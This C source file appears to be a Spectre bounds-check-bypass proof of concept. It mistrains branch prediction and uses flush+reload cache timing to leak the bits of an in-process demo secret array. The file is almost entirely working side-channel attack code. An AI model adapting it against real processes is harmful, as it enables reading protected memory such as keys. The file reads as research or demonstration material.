#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <err.h>
#include <stdbool.h>

#define LT_SIZE (128 * 1024 * 1024)
unsigned int lookup_table[LT_SIZE];

uint32_t flush_addr(void *addr);

unsigned char vuln_func(unsigned long i, uint8_t *timing_leak_array, uint8_t *source_data_array, unsigned int want_actual_access);

uint8_t secret_array[10000] = { 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1 };

uint8_t timing_leak_array_[10000];
#define timing_leak_array (timing_leak_array_ + 4096)

// check whether addr is currently cached, then flush it
bool is_cached_and_flush(void *addr) {
  uint32_t tsc_diff = flush_addr(addr);
  if (tsc_diff < 100)
    return true;
  if (tsc_diff > 150 && tsc_diff < 500)
    return false;
  printf("{{{can't classify result: %u}}}", tsc_diff);
  return false;
}

void mislead_branch_prediction(void) {
  uint8_t source_data = 0;
  uint8_t timing_leak_data = 0;
  for (int i=0; i<20; i++) {
    vuln_func(0, &timing_leak_data, &source_data, 1);
  }
}

void run_mispredicted(unsigned long i) {
  vuln_func(i, timing_leak_array, secret_array, 0);
}

extern unsigned long j_limit;

int main_j;

int main(void) {
  if (mlockall(MCL_CURRENT|MCL_FUTURE))
    err(1, "mlockall");

  for (int i=0; i < LT_SIZE; i++) {
    lookup_table[i] = random() % LT_SIZE;
  }

/*
  for (int i=0; i<16; i++) {
    printf("bit %d, expect %d\n  ", i, (int)secret_array[i]);
    for (int j=0; j<10; j++) {
      mislead_branch_prediction();
      run_mispredicted(i);
      / *
      bool is_cached_at_b0 = is_cached_and_flush(timing_leak_array);
      bool is_cached_at_b1 = is_cached_and_flush(timing_leak_array + (1<<6));
      if (is_cached_at_b0 && is_cached_at_b1)
        printf(" <error>");
      else if (!is_cached_at_b0 && !is_cached_at_b1)
        printf(" <miss>");
      else if (is_cached_at_b0 && !is_cached_at_b1)
        printf(" 0");
      else if (!is_cached_at_b0 && is_cached_at_b1)
        printf(" 1");
      * /
      // timing_leak_array
      int latency_at_b0 = flush_addr(secret_array);
      int latency_at_b1 = flush_addr(secret_array + (1<<10));
      printf("(%d,%d)\t", latency_at_b0, latency_at_b1);
    }
    printf("\n");
  }
*/

  for (int i=0; i<16*16*32; i++) {
    int bit = i >> 9;
    int attempt = (i >> 5) & 0xf;
    int mislead = i & 0x1f;
    if (attempt == 0 && mislead == 0) {
      printf("\nbit %d, expect %d\n  ", bit, (int)secret_array[bit]);
    }
    flush_addr(timing_leak_array);
    flush_addr(timing_leak_array + (1<<10));
    main_j = (mislead == 31);
    flush_addr(&j_limit);
    vuln_func(bit, timing_leak_array, secret_array, (main_j * 0x2000 + 0x500));
    int latency_at_b0 = flush_addr(timing_leak_array);
    int latency_at_b1 = flush_addr(timing_leak_array + (1<<10));
    if (mislead == 31) {
      printf("(%d,%d)\t", latency_at_b0, latency_at_b1);
    }
  }
  printf("\n");
}
